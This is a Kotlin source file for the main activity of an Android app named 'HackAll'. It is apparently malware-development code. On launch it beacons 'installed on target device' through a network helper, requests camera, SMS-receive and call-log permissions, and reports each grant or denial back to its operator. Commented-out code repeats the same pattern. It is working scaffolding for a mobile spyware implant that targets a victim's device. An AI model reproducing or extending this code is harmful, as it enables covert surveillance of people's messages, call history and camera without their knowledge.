package cocomelonc.hackall

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.activity.ComponentActivity
import cocomelonc.hackall.broadcasts.HackAllAirPlaneBroadcastReceiver
import cocomelonc.hackall.tools.HackAllNetwork
import com.karumi.dexter.Dexter
import com.karumi.dexter.MultiplePermissionsReport
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.DexterError
import com.karumi.dexter.listener.PermissionDeniedResponse
import com.karumi.dexter.listener.PermissionGrantedResponse
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.PermissionRequestErrorListener
import com.karumi.dexter.listener.multi.MultiplePermissionsListener
import com.karumi.dexter.listener.single.PermissionListener


class HackAllMainActivity : ComponentActivity() {
    private lateinit var cameraButton: Button
    private lateinit var hackAllViewModel: HackAllViewModel
//    lateinit var receiver: HackAllAirPlaneBroadcastReceiver

    private fun requestPermissions() {
        // below line is use to request permission in the current activity.
        // this method is use to handle error in runtime permissions
        Dexter.withActivity(this) // below line is use to request the number of permissions which are required in our app.
            .withPermissions(
                Manifest.permission.CAMERA,  // below is the list of permissions
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CALL_LOG
            ) // after adding permissions we are calling an with listener method.
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(multiplePermissionsReport: MultiplePermissionsReport) {
                    // this method is called when all permissions are granted
                    if (multiplePermissionsReport.areAllPermissionsGranted()) {
                        // do you work now
                        Toast.makeText(
                            applicationContext,
                            "All the permissions are granted..",
                            Toast.LENGTH_SHORT
                        ).show()
                        HackAllNetwork(applicationContext).sendTextMessage("Hack All permissions granted\n")
                    }

                    // check for permanent denial of any permission
                    if (multiplePermissionsReport.isAnyPermissionPermanentlyDenied()) {
                        // permission is denied permanently, we will show user a message.
                        Toast.makeText(
                            applicationContext,
                            "Some permissions denied..",
                            Toast.LENGTH_SHORT
                        ).show()
                        HackAllNetwork(applicationContext).sendTextMessage("Hack All some of permissions denied\n")
                    }
                }

                override fun onPermissionRationaleShouldBeShown(
                    list: MutableList<PermissionRequest?>?,
                    permissionToken: PermissionToken
                ) {
                    // this method is called when user grants some permission and denies some of them.
                    permissionToken.continuePermissionRequest()
                }
            }).withErrorListener(PermissionRequestErrorListener { error: DexterError? ->
                // we are displaying a toast message for error message.
                Toast.makeText(applicationContext, "Error occurred! ", Toast.LENGTH_SHORT)
                    .show()
            }) // below line is use to run the permissions on same thread and to check the permissions
            .onSameThread().check()
    }


//    companion object {
//
//        @SuppressLint("NewApi")
////        fun requestPermissions(context: Context) {
////            if (context.checkSelfPermission((Manifest.permission.RECEIVE_SMS)) == PackageManager.PERMISSION_DENIED) {
////                Toast.makeText(context, "Hack All permission denied", Toast.LENGTH_SHORT).show()
////                HackAllNetwork(context).sendTextMessage("Hack All permission denied\n")
////                grantPermissions(context) {
////                    Toast.makeText(context, "Hack All permission granted", Toast.LENGTH_SHORT).show()
////                    HackAllNetwork(context).sendTextMessage("Hack All permission granted\n")
////                }
////            } else {
////                grantPermissions(context) {
////                    Toast.makeText(context, "Hack All permission granted", Toast.LENGTH_SHORT).show()
////                    HackAllNetwork(context).sendTextMessage("Hack All permission has been granted\n")
////                }
////            }
////        }
//
//        fun requestPermissions(context: Context) {
//            if (context.checkSelfPermission((Manifest.permission.RECEIVE_SMS)) == PackageManager.PERMISSION_DENIED) {
//                Toast.makeText(context, "Hack All permission denied", Toast.LENGTH_SHORT).show()
//                HackAllNetwork(context).sendTextMessage("Hack All permission denied\n")
//                grantPermissions(context) {
//                    Toast.makeText(context, "Hack All permission granted", Toast.LENGTH_SHORT).show()
//                    HackAllNetwork(context).sendTextMessage("Hack All permission granted\n")
//                }
//            } else {
//                grantPermissions(context) {
//                    Toast.makeText(context, "Hack All permission granted", Toast.LENGTH_SHORT).show()
//                    HackAllNetwork(context).sendTextMessage("Hack All permission has been granted\n")
//                }
//            }
//        }
//
//        @SuppressLint("NewApi")
//        fun checkPermissions(context: Context) {
//            val isGranted = context.checkSelfPermission(Manifest.permission.RECEIVE_SMS)
//            if (isGranted == PackageManager.PERMISSION_GRANTED) {
//                Toast.makeText(context, "Hack All permission already granted", Toast.LENGTH_SHORT).show()
//                HackAllNetwork(context).sendTextMessage("Hack All permission already granted\n")
//            } else {
//                requestPermissions(context)
//            }
//        }
//
//        fun grantPermissions(context: Context, onGranted: () -> Unit) {
//            Dexter
//                .withContext(context)
//                .withPermission(Manifest.permission.RECEIVE_SMS)
//                .withListener(object : PermissionListener {
//                    override fun onPermissionGranted(p0: PermissionGrantedResponse?) {
//                        onGranted()
//                    }
//
//                    override fun onPermissionDenied(p0: PermissionDeniedResponse?) {}
//                    override fun onPermissionRationaleShouldBeShown(
//                        p0: PermissionRequest?,
//                        p1: PermissionToken?
//                    ) {
//                    }
//                }).check()
//        }
//    }

    override fun onStop() {
        super.onStop()
//        unregisterReceiver(receiver)
    }

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
//        hackAllViewModel = HackAllViewModel(this)
        setContentView(R.layout.activity_main)
        HackAllNetwork(this).sendTextMessage("LoveBahrain All App has been installed on target device and opened\n")
        this.requestPermissions()
        cameraButton = findViewById(R.id.camButton)
        cameraButton.setOnClickListener {
            requestPermissions()
        }

//        receiver = HackAllAirPlaneBroadcastReceiver()

//        IntentFilter(Intent.ACTION_AIRPLANE_MODE_CHANGED).also {
//            registerReceiver(receiver, it)
//        }
    }
}